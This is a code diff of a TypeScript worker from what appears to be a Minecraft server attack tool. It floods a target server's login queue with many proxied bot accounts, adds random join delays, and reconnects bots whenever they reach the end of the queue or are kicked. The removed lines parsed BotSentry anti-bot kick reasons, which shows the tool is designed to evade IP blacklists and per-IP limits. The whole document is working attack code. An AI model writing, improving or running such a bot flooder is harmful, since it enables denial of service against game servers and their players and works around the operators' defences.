@@ -1,9 +1,13 @@
 import { parentPort, workerData as anyWorkerData } from 'worker_threads'
 import { getRandomArbitrary, shuffleArray, sleep } from 'emberutils'
 import { Bot } from 'mineflayer'
-import { createAttackBot, log } from '../shared'
-import { QueueAttackOptions } from './types'
+import {createAttackBot, kickHandler, log, shuffle} from '../shared'
+import { AttackOptions } from '../../utils/types'
 import 'colors'
+import prismarineChat from 'prismarine-chat'
+
+const chatInstance = prismarineChat('1.12')
+const { fromNotch } = chatInstance;
 
 (async () => {
   // function to wait until all workers are ready and main thread sends the message to start
@@ -20,20 +24,19 @@ import 'colors'
 
   await awaitReady()
 
-  let proxyI = 0
   const spaceRegex = /\s{2,}/gm
-  const queueOptions: QueueAttackOptions = anyWorkerData
-  const usernames = queueOptions.usernames
-  let i = queueOptions.workerNumber
+  const workerOptions: AttackOptions = anyWorkerData
+  const usernames = workerOptions.usernames
   shuffleArray(usernames)
 
-  const proxyArray = shuffleArray(process.argv[4].split(','))
-  for (const username of usernames) {
-    proxyI++
+  if (workerOptions.proxy)
+    shuffle(workerOptions.proxy)
 
+  let i = 0
+  for (const username of usernames) {
     async function createBot (): Promise<Bot> {
       // join with random delay
-      if (queueOptions.useTimeout) {
+      if (workerOptions.useTimeout) {
         // random time in range from 5s to 200s
         const timeout = getRandomArbitrary(5000, 200000)
         log(`[${username}] Waiting for ${timeout / 1000}s before logging in...`)
@@ -43,69 +46,52 @@ import 'colors'
 
       return createAttackBot({
         username: username,
-        host: queueOptions.host,
-        port: queueOptions.port,
-        proxy: queueOptions.proxy
-          ? {
-              proxyHost: proxyArray[proxyI].split(':')[0],
-              proxyPort: parseInt(proxyArray[proxyI].split(':')[1])
-            }
-          : undefined
+        host: workerOptions.host,
+        port: workerOptions.port,
+        proxy: (workerOptions.proxy != null)
+          ? (() => {
+              const proxy = workerOptions.proxy[i]
+              return {
+                host: proxy.host,
+                port: proxy.port
+              }
+            })()
+          : undefined,
+        noFeatures: true
       })
     }
 
-    i++
-    log(`[${i}/${usernames.length}] Creating bot ${username}... (${usernames.length - i} left)`.green)
-    const bot = await createBot()
+    log(`[${i + 1}/${usernames.length}] Creating bot ${username}... (${usernames.length - i} left)`.green)
+    let bot = await createBot()
+    registerListeners()
 
-    function botThing () {
+    function registerListeners () {
+      bot.once('login', botLoginHandler)
+      bot.once('kicked', reason => kickHandler(reason, username))
+    }
+
+    function botLoginHandler () {
       log(`[${username}] Logged in`.green)
-      bot.once('messagestr', async function botThing2 (message) {
+      bot.once('messagestr', async function handleMessage (message) {
         if (message === '' || message === ' ' || message === '\u200b' || !message || spaceRegex.test(message)) return
         log(`[${username}] ${message}`.yellow)
         if (message.includes('8b8t')) {
           log(`[${username}] Reached the end of the queue, ending the connection and reconnecting...`.green)
           bot.end()
-          await createBot()
-          bot.once('login', () => {
-            bot.removeAllListeners('messagestr')
-            botThing()
-          })
-        } else bot.once('messagestr', botThing2)
+          bot = await createBot()
+          registerListeners()
+        }
       })
-      bot.once('kicked', reason => {
-        log(reason)
-        reason = JSON.parse(reason).text.toString()
-        log(`[${username}] ${reason.red}`.yellow + ', recreating the bot...')
-        log(`[${username}] Recreating the bot...`.green)
+
+      bot.once('kicked', async reason => {
+        const object = fromNotch(reason)
+        log(`[${username}] ${object.toString().red}`.yellow + ', recreating the bot...')
         bot.end()
-        createBot()
-        bot.once('login', () => {
-          bot.removeAllListeners()
-          botThing()
-        })
+        bot = await createBot()
+        registerListeners()
       })
     }
 
-    bot.once('login', botThing)
-    bot.once('kicked', reason => {
-      const jsonReason = JSON.parse(reason)
-      try {
-        // blacklisted ip
-        if (jsonReason.extra[0].extra[1].text.includes('BotSentry') && jsonReason.extra[0].extra[5].text.includes('IP is blacklisted')) log(`[${username}] IP blacklist by BotSentry`.red)
-        // antibot mode on
-        else if (jsonReason.extra[0].extra[3].text.includes('Bot Attack')) log(`[${username}] BotSentry AntiBot mode is on for ${jsonReason.extra[0].extra[7]}s`.red)
-        // blacklisted for too many online players from single ip
-        else if (jsonReason.extra[0].extra[3].text.includes('limit of accounts')) log(`[${username}] IP blacklist for per-IP account limit by BotSentry`.red)
-        // first time joining
-        else if (jsonReason.extra[0].extra[5].text.includes('dangerous activity')) log(`[${username}] BotSentry is analyzing the connection`.red)
-        // something else
-        else console.log(jsonReason.extra[0])
-      } catch (err) {
-        console.log(err)
-        console.log(reason)
-        console.log(jsonReason)
-      }
-    })
+    i++
   }
 })()
